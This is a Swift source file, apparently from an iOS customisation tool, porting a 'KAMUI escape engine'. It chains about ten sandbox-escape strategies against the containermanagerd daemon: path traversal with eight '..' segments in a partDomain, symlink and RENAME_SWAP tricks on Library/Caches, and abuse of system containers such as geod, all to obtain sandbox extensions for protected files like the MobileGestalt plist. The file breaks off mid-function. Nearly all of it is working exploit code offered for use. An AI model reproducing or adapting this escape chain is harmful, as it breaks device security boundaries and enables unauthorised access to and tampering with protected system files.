//
//  BQCore.swift
//  worsegestalt
//
//  Swift port of the KAMUI escape engine (previously
//  Sources/CQueryBridges/Kamui/BQCore.m; MIT, © 2026 KAMUI contributors, see
//  KamuiEngine-LICENSE). Walks a multi-strategy containermanagerd escape chain:
//
//    0. bad_query file form           — class 13 + 8-dot partDomain traversal
//                                       to com.apple.MobileGestalt.plist inside
//                                       the MG system group (the
//                                       free-certificate form GestaltEdit uses
//                                       on iOS 27.x).
//    1. class-13 part-domain traversal to any absolute target.
//    2. class-12 geod: direct token, then Caches-symlink replay.
//    3. class 7 (App Group) Caches symlink.
//    4. class 2 Caches<->symlink swap via renameatx_np(RENAME_SWAP).
//    5. class 2 staged fake Library/Caches tree.
//    6. class 2 subpath symlink (partDomain based).
//    7. class 2 Library swap / parent Library move (opt-in, crash-guarded).
//    8. class 13 direct group query.
//    9. class 12 geod part-domain traversal.
//
//  Every strategy ends with the kernel issuing a sandbox extension tied to the
//  target vnode. Release the handle with endEscape() when done.
//
//  The only remaining ObjC code in the package is the worse_query exploit
//  itself (Sources/CQueryBridges/worse_query.m, GPL-3.0 © Taj C / forcequit).
//
//  SPDX-License-Identifier: GPL-3.0-or-later
//

import Foundation
import UIKit
import WebKit

// MARK: - C function pointer types (MCM/containermanagerd)

private typealias BQQueryCreateFn = @convention(c) () -> UnsafeMutableRawPointer?
private typealias BQU64Fn = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
private typealias BQObjFn = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
private typealias BQCStrFn = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
private typealias BQGetOneFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
private typealias BQCopyTokenFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutablePointer<CChar>?
private typealias BQGetPathFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?
private typealias BQFreeFn = @convention(c) (UnsafeMutableRawPointer?) -> Void
private typealias BQConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
private typealias BQReleaseFn = @convention(c) (Int64) -> Void
private typealias BQLastErrFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
private typealias BQErrMsgFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?
private typealias BQErrIntFn = @convention(c) (UnsafeMutableRawPointer?) -> Int32
private typealias BQXPCStringFn = @convention(c) (UnsafePointer<CChar>?) -> UnsafeMutableRawPointer?
private typealias BQXPCReleaseFn = @convention(c) (UnsafeMutableRawPointer?) -> Void
private typealias BQSecTaskCreateFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
private typealias BQSecTaskCopyEntFn = @convention(c) (UnsafeMutableRawPointer?, CFString, UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?

// MARK: - Engine

enum BQ {
    private static let kMGGroup = "systemgroup.com.apple.mobilegestaltcache"
    private static let kMGCaches =
        "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"

    // ---- logging / paths --------------------------------------------------

    private static let logLock = NSLock()
    private static var cachedLogPath: String?

    static func documents() -> String {
        FileManager.default
            .urls(for: .documentDirectory, in: .userDomainMask)
            .first?.path ?? NSHomeDirectory()
    }

    static func logPath() -> String {
        if let cached = cachedLogPath { return cached }
        let path = (documents() as NSString).appendingPathComponent("bqtool.log")
        cachedLogPath = path
        return path
    }

    // The log handle is kept open for the process lifetime: reopening the
    // file per line dominated the engine's logging cost. Sync happens on
    // LogView flushes rather than per line.
    private static var cachedLogHandle: FileHandle?

    /// NSLog + append to Documents/bqtool.log. Thread-safe (NSLock).
    static func log(_ message: String) {
        NSLog("[bqtool] %@", message)
        logLock.lock()
        defer { logLock.unlock() }
        if cachedLogHandle == nil {
            let fm = FileManager.default
            if !fm.fileExists(atPath: logPath()) {
                fm.createFile(atPath: logPath(), contents: nil)
            }
            cachedLogHandle = FileHandle(forWritingAtPath: logPath())
        }
        guard let handle = cachedLogHandle,
              let data = (message + "\n").data(using: .utf8) else { return }
        _ = try? handle.seekToEnd()
        try? handle.write(contentsOf: data)
    }

    // ---- App Group (SecTask-driven) ---------------------------------------

    private static var cachedGroupID: String?
    private static var cachedGroupIDs: [String] = []

    static func groupID() -> String? {
        if cachedGroupID == nil { discoverGroups() }
        return cachedGroupID
    }

    static func groupIDs() -> [String] {
        if cachedGroupID == nil { discoverGroups() }
        return cachedGroupIDs
    }

    static func groupRoot() -> String? {
        if let cached = cachedGroupRoot { return cached }
        guard let group = groupID(), !group.isEmpty else { return nil }
        let root = FileManager.default
            .containerURL(forSecurityApplicationGroupIdentifier: group)?
            .path
        cachedGroupRoot = root
        return root
    }

    private static var cachedGroupRoot: String?

    /// Read the app's own entitlements via SecTask. This lets the exploit use
    /// whatever app group the running build actually has, instead of a
    /// hardcoded identifier (works inside LiveContainer etc.).
    private static func discoverGroups() {
        // Apple's dlfcn.h defines RTLD_DEFAULT as a cast macro; spell it out.
        let rtldDefault = UnsafeMutableRawPointer(bitPattern: -2)!
        let sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW) ?? rtldDefault
        let createRaw = dlsym(rtldDefault, "SecTaskCreateFromSelf") ?? dlsym(sec, "SecTaskCreateFromSelf")
        let copyRaw = dlsym(rtldDefault, "SecTaskCopyValueForEntitlement") ?? dlsym(sec, "SecTaskCopyValueForEntitlement")
        guard let createRaw, let copyRaw else {
            log("app group entitlement: (none) [SecTask symbols unresolved]")
            return
        }
        let create = unsafeBitCast(createRaw, to: BQSecTaskCreateFn.self)
        let copy = unsafeBitCast(copyRaw, to: BQSecTaskCopyEntFn.self)
        guard let task = create(nil) else { return }
        defer { Unmanaged<CFTypeRef>.fromOpaque(task).release() }
        guard let val = copy(task, "com.apple.security.application-groups" as CFString, nil),
              CFGetTypeID(unsafeBitCast(val, to: CFTypeRef.self)) == CFArrayGetTypeID() else { return }
        defer { Unmanaged<CFTypeRef>.fromOpaque(val).release() }
        let arr = unsafeBitCast(val, to: CFArray.self)
        var all: [String] = []
        for i in 0..<CFArrayGetCount(arr) {
            guard let item = CFArrayGetValueAtIndex(arr, CFIndex(i)),
                  CFGetTypeID(unsafeBitCast(item, to: CFTypeRef.self)) == CFStringGetTypeID() else { continue }
            all.append(unsafeBitCast(item, to: CFString.self) as String)
        }
        if !all.isEmpty {
            cachedGroupIDs = all
            cachedGroupID = all[0]
        }
        log("app group entitlement: \(cachedGroupID ?? "(none)")")
    }

    // ---- class-2 fallback toggle (opt-in from Settings) --------------------

    private static let stateLock = NSLock()
    private static var class2ParentEnabledCache = false

    static var class2ParentEnabled: Bool {
        get { stateLock.lock(); defer { stateLock.unlock() }; return class2ParentEnabledCache }
        set {
            stateLock.lock(); class2ParentEnabledCache = newValue; stateLock.unlock()
            let defs = UserDefaults.standard
            defs.set(newValue, forKey: "BQClass2ParentEnabled")
            defs.synchronize()
            log("class2-parent enabled=\(newValue ? 1 : 0)")
        }
    }

    /// Pristine copy of the MobileGestalt plist, written once by the store.
    static func backupPath() -> String {
        (documents() as NSString).appendingPathComponent("OriginalGestalt.plist")
    }

    // ---- init --------------------------------------------------------------

    private static var coreInitOnce = false
    private static var coreInitOk = false

    static func coreInit() -> Bool {
        stateLock.lock()
        if coreInitOnce { let ok = coreInitOk; stateLock.unlock(); return ok }
        coreInitOnce = true
        stateLock.unlock()

        let fm = FileManager.default
        let docs = documents()
        try? fm.createDirectory(atPath: (docs as NSString).appendingPathComponent("tendies"),
                                withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: (docs as NSString).appendingPathComponent("PosterBoard/Wallpapers"),
                                withIntermediateDirectories: true)

        let defs = UserDefaults.standard
        var parent = defs.bool(forKey: "BQClass2ParentEnabled")
        if parent && defs.bool(forKey: "BQClass2ParentCrashGuard") {
            parent = false
            defs.set(false, forKey: "BQClass2ParentEnabled")
            defs.set(false, forKey: "BQClass2ParentCrashGuard")
            defs.synchronize()
            log("class2-parent disabled after a previous attempt did not finish")
        } else if parent {
            defs.set(true, forKey: "BQClass2ParentCrashGuard")
            defs.synchronize()
        } else {
            defs.set(false, forKey: "BQClass2ParentCrashGuard")
        }
        stateLock.lock()
        class2ParentEnabledCache = parent
        stateLock.unlock()

        log("=== BQEscape start | iOS \(UIDevice.current.systemVersion) | bundle \(Bundle.main.bundleIdentifier ?? "(nil)") ===")
        loadMCM()
        let gid = groupID()
        let root = groupRoot()
        log("app group: id=\(gid ?? "(none)") root=\(root ?? "(none)")")
        let ok = mcm.create != nil && mcm.getOne != nil &&
            mcm.copyToken != nil && mcm.consume != nil && mcm.release != nil
        stateLock.lock()
        coreInitOk = ok
        stateLock.unlock()
        log("core init ok=\(ok ? 1 : 0)")
        return ok
    }

    // ---- MCM symbol table --------------------------------------------------

    fileprivate final class MCM {
        var h: UnsafeMutableRawPointer?
        var create: BQQueryCreateFn?
        var setClass: BQU64Fn?
        var setIDs: BQObjFn?
        var setGroupIDs: BQObjFn?
        var setFlags: BQU64Fn?
        var setPart: BQU64Fn?
        var setDomain: BQCStrFn?
        var getOne: BQGetOneFn?
        var copyToken: BQCopyTokenFn?
        var getPath: BQGetPathFn?
        var queryFree: BQFreeFn?
        var consume: BQConsumeFn?
        var release: BQReleaseFn?
        var lastError: BQLastErrFn?
        var errMessage: BQErrMsgFn?
        var errPosix: BQErrIntFn?
    }

    private static let mcm = MCM()
    private static var xpcStringCreateF: BQXPCStringFn?
    private static var xpcReleaseF: BQXPCReleaseFn?

    private static func sym(_ handle: UnsafeMutableRawPointer?, _ a: String, _ b: String? = nil) -> UnsafeMutableRawPointer? {
        var p = dlsym(handle, a)
        if p == nil, let b { p = dlsym(handle, b) }
        return p
    }

    private static func loadMCM() {
        stateLock.lock()
        if mcm.create != nil { stateLock.unlock(); return }
        stateLock.unlock()

        mcm.h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL)
        if mcm.h == nil {
            log("dlopen MCM failed: \(dlerror().map { String(cString: $0) } ?? "(nil)")")
            return
        }
        let rtldDefault = UnsafeMutableRawPointer(bitPattern: -2)!
        mcm.create = sym(mcm.h, "container_query_create").map { unsafeBitCast($0, to: BQQueryCreateFn.self) }
        mcm.setClass = sym(mcm.h, "container_query_set_class").map { unsafeBitCast($0, to: BQU64Fn.self) }
        mcm.setIDs = sym(mcm.h, "container_query_set_identifiers").map { unsafeBitCast($0, to: BQObjFn.self) }
        mcm.setGroupIDs = sym(mcm.h, "container_query_set_group_identifiers").map { unsafeBitCast($0, to: BQObjFn.self) }
        mcm.setFlags = sym(mcm.h, "container_query_operation_set_flags", "container_query_set_flags")
            .map { unsafeBitCast($0, to: BQU64Fn.self) }
        mcm.setPart = sym(mcm.h, "container_query_operation_set_part", "container_query_set_part")
            .map { unsafeBitCast($0, to: BQU64Fn.self) }
        mcm.setDomain = sym(mcm.h, "container_query_operation_set_part_domain", "container_query_set_part_domain")
            .map { unsafeBitCast($0, to: BQCStrFn.self) }
        mcm.getOne = sym(mcm.h, "container_query_get_single_result").map { unsafeBitCast($0, to: BQGetOneFn.self) }
        mcm.copyToken = sym(mcm.h, "container_copy_sandbox_token").map { unsafeBitCast($0, to: BQCopyTokenFn.self) }
        mcm.getPath = sym(mcm.h, "container_object_get_path").map { unsafeBitCast($0, to: BQGetPathFn.self) }
        mcm.queryFree = sym(mcm.h, "container_query_free").map { unsafeBitCast($0, to: BQFreeFn.self) }
        mcm.consume = dlsym(rtldDefault, "sandbox_extension_consume")
            .map { unsafeBitCast($0, to: BQConsumeFn.self) }
        mcm.release = dlsym(rtldDefault, "sandbox_extension_release")
            .map { unsafeBitCast($0, to: BQReleaseFn.self) }
        mcm.lastError = sym(mcm.h, "container_query_get_last_error").map { unsafeBitCast($0, to: BQLastErrFn.self) }
        mcm.errMessage = sym(mcm.h, "container_error_get_message").map { unsafeBitCast($0, to: BQErrMsgFn.self) }
        mcm.errPosix = sym(mcm.h, "container_error_get_posix_errno").map { unsafeBitCast($0, to: BQErrIntFn.self) }
        xpcStringCreateF = dlsym(rtldDefault, "xpc_string_create").map { unsafeBitCast($0, to: BQXPCStringFn.self) }
        xpcReleaseF = dlsym(rtldDefault, "xpc_release").map { unsafeBitCast($0, to: BQXPCReleaseFn.self) }
        log("MCM loaded=\(mcm.h != nil) create=\(mcm.create != nil) get=\(mcm.getOne != nil) token=\(mcm.copyToken != nil) consume=\(mcm.consume != nil) release=\(mcm.release != nil)")
    }

    private static func xpcStringCreate(_ s: String) -> UnsafeMutableRawPointer? {
        xpcStringCreateF?(s)
    }

    private static func release(_ handle: Int64) {
        mcm.release?(handle)
    }

    private static func logQueryError(_ q: UnsafeMutableRawPointer?, _ where_: String) {
        guard let q, let lastError = mcm.lastError, let e = lastError(q) else { return }
        let posix = mcm.errPosix?(e) ?? 0
        let msg = mcm.errMessage?(e).map { String(cString: $0) } ?? "(null)"
        log("\(where_): last_error posix=\(posix) msg=\(msg)")
    }

    // ---- fs primitives -----------------------------------------------------

    private static func statIsSymlink(_ path: String) -> Bool {
        var st = stat()
        return lstat(path, &st) == 0 && (st.st_mode & S_IFMT) == S_IFLNK
    }

    private static func canOpenDir(_ path: String) -> Bool {
        guard let d = opendir(path) else { return false }
        closedir(d)
        return true
    }

    /// Atomic exchange of two paths via renameatx_np(RENAME_SWAP).
    private static func renameSwap(_ a: String, _ b: String) -> Bool {
        renameatx_np(AT_FDCWD, a, AT_FDCWD, b, UInt32(RENAME_SWAP)) == 0
    }

    private static func recover(_ path: String, _ bak: String) {
        let fm = FileManager.default
        guard fm.fileExists(atPath: bak) else { return }
        try? fm.removeItem(atPath: path)
        do {
            try fm.moveItem(atPath: bak, toPath: path)
        } catch {
            log("recover \(bak) -> \(path) failed: \(error)")
        }
    }

    private static func swapPath(path: String, target: String, bak: String) -> Bool {
        let fm = FileManager.default
        try? fm.removeItem(atPath: bak)
        if fm.fileExists(atPath: path) {
            do {
                try fm.moveItem(atPath: path, toPath: bak)
            } catch {
                log("swap move \(path) -> \(bak) failed: \(error)")
                return false
            }
        }
        unlink(path)
        if symlink(target, path) != 0 {
            log("symlink \(path) -> \(target) failed errno=\(errno) (\(String(cString: strerror(errno))))")
            if fm.fileExists(atPath: bak) { try? fm.moveItem(atPath: bak, toPath: path) }
            return false
        }
        return true
    }

    private static func restorePath(_ path: String, _ bak: String) {
        let fm = FileManager.default
        if fm.fileExists(atPath: bak) {
            try? fm.removeItem(atPath: path)
            do {
                try fm.moveItem(atPath: bak, toPath: path)
            } catch {
                log("restore \(bak) -> \(path) failed: \(error)")
            }
        } else {
            if fm.fileExists(atPath: path) && statIsSymlink(path) {
                try? fm.removeItem(atPath: path)
            }
            if !fm.fileExists(atPath: path) {
                try? fm.createDirectory(atPath: path, withIntermediateDirectories: true)
            }
        }
    }

    // ---- query helpers -----------------------------------------------------

    private static func dots(_ n: Int) -> String {
        Array(repeating: "..", count: n).joined(separator: "/")
    }

    private static func queryEscape(_ cls: UInt64, ident: String, group: Bool, part: UInt64,
                                    domain: String?, flags: UInt64, label: String,
                                    outPath: inout String?) -> Int64 {
        guard let create = mcm.create, !ident.isEmpty else { return -1 }
        guard let q = create() else { return -2 }

        mcm.setClass?(q, cls)
        let x = xpcStringCreate(ident)
        if group, mcm.setGroupIDs != nil {
            mcm.setGroupIDs?(q, x)
        } else if mcm.setIDs != nil {
            mcm.setIDs?(q, x)
        } else {
            mcm.setGroupIDs?(q, x)
        }
        mcm.setPart?(q, part)
        if let domain, !domain.isEmpty { mcm.setDomain?(q, domain) }
        mcm.setFlags?(q, flags)
        if let x { _ = xpcReleaseF?(x) }

        let res = mcm.getOne?(q)
        var path: String?
        if let res, let cp = mcm.getPath?(res) { path = String(cString: cp) }
        var h: Int64 = -5
        if let tok = (res != nil ? mcm.copyToken?(res) : nil) {
            if let consume = mcm.consume { h = consume(tok) }
            free(tok)
        }
        log("strategy \(label): cls=\(cls) ident=\(ident) part=\(part) path=\(path ?? "(null)") consume=\(h)")
        if res == nil { logQueryError(q, label) }
        mcm.queryFree?(q)
        if h >= 0 { outPath = path }
        return h
    }

    private static func queryPathOnly(cls: UInt64, ident: String, group: Bool,
                                      part: UInt64, flags: UInt64) -> String? {
        guard let create = mcm.create, !ident.isEmpty else { return nil }
        guard let q = create() else { return nil }
        mcm.setClass?(q, cls)
        let x = xpcStringCreate(ident)
        if group, mcm.setGroupIDs != nil {
            mcm.setGroupIDs?(q, x)
        } else if mcm.setIDs != nil {
            mcm.setIDs?(q, x)
        } else if mcm.setGroupIDs != nil {
            mcm.setGroupIDs?(q, x)
        }
        mcm.setPart?(q, part)
        mcm.setFlags?(q, flags)
        if let x { _ = xpcReleaseF?(x) }
        let res = mcm.getOne?(q)
        var path: String?
        if let res, let cp = mcm.getPath?(res) { path = String(cString: cp) }
        mcm.queryFree?(q)
        return path
    }

    // ---- escape strategies --------------------------------------------------

    private static func escapeBadQueryFile(_ caches: String, _ linkOut: inout String?) -> Int64 {
        let file1 = (caches as NSString).appendingPathComponent("com.apple.MobileGestalt.plist")
        let file2 = file1.hasPrefix("/private/var/")
            ? "/var/" + String(file1.dropFirst("/private/var/".count))
            : file1
        var last: Int64 = -1
        for file in [file2, file1] {
            guard file.hasPrefix("/") else { continue }
            let dom = dots(8) + file
            var path: String?
            let h = queryEscape(13, ident: kMGGroup, group: true, part: 3,
                                domain: dom, flags: 0x8000000000, label: "bad_query-file",
                                outPath: &path)
            if h < 0 {
                last = h
                continue
            }
            let fd = open(file, O_RDWR | O_CLOEXEC)
            if fd >= 0 {
                close(fd)
                linkOut = file
                log("escape: using bad_query file -> \(file)")
                return h
            }
            log("bad_query-file: token did not open \(file) errno=\(errno)")
            release(h)
            last = -5
        }
        return last
    }

    // Class 2 staged symlink: put a tiny fake tree inside the app's own
    // Library/Caches, then use partDomain so MCM appends "Library/Caches" behind
    // a symlink that resolves to the target. No Library move and no app group.
    private static func escapeClass2Stage(_ target: String, _ linkOut: inout String?) -> Int64 {
        let home = NSHomeDirectory()
        let bid = Bundle.main.bundleIdentifier ?? ""
        if home.isEmpty || bid.isEmpty { return -6 }
        guard mcm.setDomain != nil else { return -1 }
        let fm = FileManager.default
        let caches = (home as NSString).appendingPathComponent("Library/Caches")
        try? fm.createDirectory(atPath: caches, withIntermediateDirectories: true)
        let tag = ".bq_stage_\(getpid())"
        let stage = (caches as NSString).appendingPathComponent(tag)
        let link = (caches as NSString).appendingPathComponent(".bq_slink_\(getpid())")
        let stageLib = (stage as NSString).appendingPathComponent("Library")
        let stageCaches = (stageLib as NSString).appendingPathComponent("Caches")

        try? fm.removeItem(atPath: stage)
        unlink(link)
        do {
            try fm.createDirectory(atPath: stageLib, withIntermediateDirectories: true)
        } catch {
            return -2
        }
        if symlink(target, stageCaches) != 0 {
            try? fm.removeItem(atPath: stage)
            return -2
        }
        if symlink(stage, link) != 0 {
            unlink(stageCaches)
            try? fm.removeItem(atPath: stage)
            return -2
        }

        func cleanupStage() {
            unlink(link)
            unlink(stageCaches)
            rmdir(stageLib)
            rmdir(stage)
        }

        let linkLeaf = (link as NSString).lastPathComponent
        let domains = [
            "Library/Caches/\(linkLeaf)",
            "Caches/\(linkLeaf)",
            linkLeaf,
        ]
        var last: Int64 = -1
        for domain in domains {
            var path: String?
            let h = queryEscape(2, ident: bid, group: false, part: 3, domain: domain,
                                flags: 0x8000000000, label: "class2-stage-\(domain)",
                                outPath: &path)
            if h >= 0 {
                if !canOpenDir(target) {
                    log("class2-stage: token did not open target (\(path ?? "(null)"))")
                    release(h)
                    last = -5
                    continue
                }
                cleanupStage()
                linkOut = target
                log("escape: using class2 stage (\(domain)) path=\(path ?? "(null)")")
                return h
            }
            last = h
        }
        cleanupStage()
        return last
    }

    // Class 2 subpath symlink: create a symlink inside the app's own
    // Library/Caches and ask MCM for part 3 with a non-empty partDomain. This
    // keeps Library in place (no process-killing rename) and may make the
    // daemon resolve the symlink while issuing the extension. Safe to attempt:
    // only a temporary symlink inside Caches is touched.
    private static func escapeClass2Subpath(_ target: String, _ linkOut: inout String?) -> Int64 {
        let home = NSHomeDirectory()
        let bid = Bundle.main.bundleIdentifier ?? ""
        if home.isEmpty || bid.isEmpty { return -6 }
        guard mcm.setDomain != nil else { return -1 }
        let fm = FileManager.default
        let caches = (home as NSString).appendingPathComponent("Library/Caches")
        try? fm.createDirectory(atPath: caches, withIntermediateDirectories: true)
        let leaf = ".bq_link_\(getpid())"
        let link = (caches as NSString).appendingPathComponent(leaf)
        unlink(link)
        if symlink(target, link) != 0 {
            log("class2-subpath: symlink failed errno=\(errno) (\(String(cString: strerror(errno))))")
            return -2
        }

        let domains = [leaf, "Caches/\(leaf)", "Library/Caches/\(leaf)"]
        var last: Int64 = -1
        for domain in domains {
            var path: String?
            let h = queryEscape(2, ident: bid, group: false, part: 3, domain: domain,
                                flags: 0x8000000000, label: "class2-subpath-\(domain)",
                                outPath: &path)
            if h >= 0 {
                // A token for the symlink path is not enough: the editor needs
                // the resolved target. Verify before reporting success.
                if !canOpenDir(target) {
                    log("class2-subpath: token did not open target (\(path ?? "(null)"))")
                    release(h)
                    last = -5
                    continue
                }
                unlink(link)
                linkOut = target
                log("escape: using class2 subpath (\(domain)) path=\(path ?? "(null)")")
                return h
            }
            last = h
        }
        unlink(link)
        return last
    }

    private static func class2SwapTemp() -> String {
        (NSHomeDirectory() as NSString).appendingPathComponent("Library/.bq_cache_link")
    }

    private static func class2LibStage() -> String {
        (NSHomeDirectory() as NSString).appendingPathComponent(".bq_lib_swap")
    }

    private static func recoverClass2LibSwap() {
        let home = NSHomeDirectory()
        guard !home.isEmpty else { return }
        let fm = FileManager.default
        let lib = (home as NSString).appendingPathComponent("Library")
        let stage = class2LibStage()
        let caches = (lib as NSString).appendingPathComponent("Caches")
        if statIsSymlink(caches) && fm.fileExists(atPath: stage) {
            if renameSwap(lib, stage) {
                try? fm.removeItem(atPath: stage)
                log("class2-library-swap: recovered interrupted swap")
            }
        } else if fm.fileExists(atPath: stage) {
            try? fm.removeItem(atPath: stage)
        }
    }

    // Atomic Library swap: replace Library with a staging directory whose Caches
    // entry points at the target and whose other entries symlink back to the
    // real Library (which moves to the staging path during the swap). This keeps
    // NSUserDefaults and friends alive, unlike the older move-based fallback.
    private static func escapeClass2LibrarySwap(_ target: String, _ linkOut: inout String?) -> Int64 {
        let home = NSHomeDirectory()
        let bid = Bundle.main.bundleIdentifier ?? ""
        if home.isEmpty || bid.isEmpty { return -6 }
        let fm = FileManager.default
        let lib = (home as NSString).appendingPathComponent("Library")
        let stage = class2LibStage()

        recoverClass2LibSwap()
        try? fm.removeItem(atPath: stage)
        guard fm.fileExists(atPath: lib) else { return -2 }
        do {
            try fm.createDirectory(atPath: stage, withIntermediateDirectories: true)
        } catch {
            return -2
        }

        // Symlink every original Library child into the staging dir. After the
        // swap, the staging path holds the real Library, so these resolve back.
        for child in (try? fm.contentsOfDirectory(atPath: lib)) ?? [] {
            if child == "Caches" { continue }
            let newChild = (stage as NSString).appendingPathComponent(child)
            symlink(newChild, newChild)
        }
        let stageCaches = (stage as NSString).appendingPathComponent("Caches")
        if symlink(target, stageCaches) != 0 {
            try? fm.removeItem(atPath: stage)
            return -2
        }

        if !renameSwap(lib, stage) {
            log("class2-library-swap: RENAME_SWAP failed errno=\(errno) (\(String(cString: strerror(errno))))")
            try? fm.removeItem(atPath: stage)
            return -2
        }

        var path: String?
        var h = queryEscape(2, ident: bid, group: false, part: 3, domain: "",
                            flags: 0x8000000000, label: "class2-library-swap", outPath: &path)
        if h >= 0 {
            if !canOpenDir(target) {
                log("class2-library-swap: token did not open target (\(path ?? "(null)"))")
                release(h)
                h = -5
            }
        }

        if !renameSwap(lib, stage) {
            log("class2-library-swap: swap back failed errno=\(errno) (\(String(cString: strerror(errno))))")
        }
        try? fm.removeItem(atPath: stage)

        if h >= 0 {
            linkOut = target
            log("escape: using class2 library swap")
        }
        return h
    }

    private static func recoverClass2Swap() {
        let home = NSHomeDirectory()
        guard !home.isEmpty else { return }
        let caches = (NSHomeDirectory() as NSString).appendingPathComponent("Library/Caches")
        let temp = class2SwapTemp()
        if statIsSymlink(caches) && FileManager.default.fileExists(atPath: temp) {
            if renameSwap(caches, temp) {
                unlink(temp)
                log("class2-swap: recovered interrupted swap")
            }
        } else if statIsSymlink(temp) {
            unlink(temp)
        }
    }

    // Class 2 Caches<->symlink swap. Unlike a plain rename, RENAME_SWAP may not
    // require file-write-unlink on the part directory. It never moves Library,
    // so it cannot trigger the 2.2 process kill.
    private static func escapeClass2Swap(_ target: String, _ linkOut: inout String?) -> Int64 {
        let home = NSHomeDirectory()
        let bid = Bundle.main.bundleIdentifier ?? ""
        if home.isEmpty || bid.isEmpty { return -6 }
        let fm = FileManager.default
        let lib = (home as NSString).appendingPathComponent("Library")
        let caches = (lib as NSString).appendingPathComponent("Caches")
        let temp = class2SwapTemp()
        try? fm.createDirectory(atPath: lib, withIntermediateDirectories: true)

        recoverClass2Swap()
        unlink(temp)
        if symlink(target, temp) != 0 { return -2 }

        if !renameSwap(caches, temp) {
            log("class2-swap: RENAME_SWAP failed errno=\(errno) (\(String(cString: strerror(errno))))")
            unlink(temp)
            return -2
        }

        var path: String?
        var h = queryEscape(2, ident: bid, group: false, part: 3, domain: "",
                            flags: 0x8000000000, label: "class2-swap", outPath: &path)
        if h >= 0 && !canOpenDir(target) {
            log("class2-swap: token did not open target (\(path ?? "(null)"))")
            release(h)
            h = -5
        }

        // Swap back: Caches becomes the original directory, temp the symlink.
        if !renameSwap(caches, temp) {
            log("class2-swap: swap back failed errno=\(errno) (\(String(cString: strerror(errno))))")
        }
        unlink(temp)

        if h >= 0 {
            linkOut = target
            log("escape: using class2 swap")
        }
        return h
    }

    // Class 2 parent-directory symlink. No app group needed: move the app's
    // Library aside, create Library/Caches -> target, query the app's own
    // container (class 2), then restore Library. Off by default: some builds
    // kill the process for moving Library, so this is opt-in from Settings.
    private static func escapeClass2Parent(_ target: String, _ linkOut: inout String?) -> Int64 {
        let home = NSHomeDirectory()
        let bid = Bundle.main.bundleIdentifier ?? ""
        if home.isEmpty || bid.isEmpty { return -6 }

        let fm = FileManager.default
        let lib = (home as NSString).appendingPathComponent("Library")
        let bak = (home as NSString).appendingPathComponent("Library.bqtool")
        let caches = (lib as NSString).appendingPathComponent("Caches")

        // Recover an interrupted attempt. A stale backup is only safe to
        // restore when the live Library is missing or is our temporary Caches
        // symlink.
        if fm.fileExists(atPath: bak) {
            let isTempSymlink = fm.fileExists(atPath: lib) && statIsSymlink(caches)
            if isTempSymlink || !fm.fileExists(atPath: lib) {
                restorePath(lib, bak)
            } else {
                log("class2-parent: stale \(bak) exists; refusing to touch \(lib)")
                return -2
            }
        }
        guard fm.fileExists(atPath: lib) else { return -2 }

        do {
            try fm.moveItem(atPath: lib, toPath: bak)
        } catch {
            log("class2-parent: move Library -> bak failed: \(error)")
            return -2
        }
        do {
            try fm.createDirectory(atPath: lib, withIntermediateDirectories: true)
        } catch {
            log("class2-parent: recreate Library failed: \(error)")
            try? fm.moveItem(atPath: bak, toPath: lib)
            return -2
        }
        if symlink(target, caches) != 0 {
            log("class2-parent: symlink Caches failed errno=\(errno) (\(String(cString: strerror(errno))))")
            restorePath(lib, bak)
            return -2
        }

        var path: String?
        let h = queryEscape(2, ident: bid, group: false, part: 3, domain: "",
                            flags: 0x8000000000, label: "class2-parent", outPath: &path)
        // Restore the real Library before returning. Remove the symlink first
        // so a recursive directory removal can never walk into the target.
        unlink(caches)
        rmdir(lib)
        do {
            try fm.moveItem(atPath: bak, toPath: lib)
        } catch {
            log("class2-parent: restore Library failed: \(error)")
            restorePath(lib, bak)
        }
        if h >= 0 {
            if !canOpenDir(target) {
                log("class2-parent: token did not open target")
                release(h)
                return -5
            }
            linkOut = target
            log("escape: using class2 parent -> \(target)")
        }
        return h
    }

    // App-group part-directory symlink (class 7). Works on 27.2 with a
    // registered group.
    private static func escapeSymlink(_ target: String, _ linkOut: inout String?) -> Int64 {
        let ids = groupIDs()
        guard !ids.isEmpty else { return -6 }
        let fm = FileManager.default
        var last: Int64 = -6
        for gid in ids {
            guard let groot = fm.containerURL(forSecurityApplicationGroupIdentifier: gid)?.path,
                  !groot.isEmpty else { continue }
            let lib = (groot as NSString).appendingPathComponent("Library")
            let caches = (lib as NSString).appendingPathComponent("Caches")
            let bak = (lib as NSString).appendingPathComponent("Caches.bqtool")
            try? fm.createDirectory(atPath: lib, withIntermediateDirectories: true)
            recover(lib, (groot as NSString).appendingPathComponent("Library.bq_orig"))
            recover(caches, bak)
            if !fm.fileExists(atPath: caches) {
                try? fm.createDirectory(atPath: caches, withIntermediateDirectories: true)
            }
            guard swapPath(path: caches, target: target, bak: bak) else {
                restorePath(caches, bak)
                last = -2
                continue
            }
            var path: String?
            let h = queryEscape(7, ident: gid, group: true, part: 3, domain: "",
                                flags: 0x8000000000, label: "class7-symlink/\(gid)",
                                outPath: &path)
            if h >= 0 {
                stateLock.lock()
                escapeGroupRoot = groot
                stateLock.unlock()
                linkOut = caches
                return h
            }
            restorePath(caches, bak)
            last = h
        }
        return last
    }

    // Class 12 held com.apple.geod as a built-in allowed container. The
    // traversal was patched, but a direct part-3 query may still issue a token
    // to an ordinary app. Use geod's writable Library/Caches as the symlink
    // base for the target.
    private static func escapeGeodSymlink(_ target: String, _ linkOut: inout String?) -> Int64 {
        let gid = "com.apple.geod"
        var caches = (queryPathOnly(cls: 12, ident: gid, group: false, part: 3, flags: 0x100000000) ?? "")
        if caches.isEmpty {
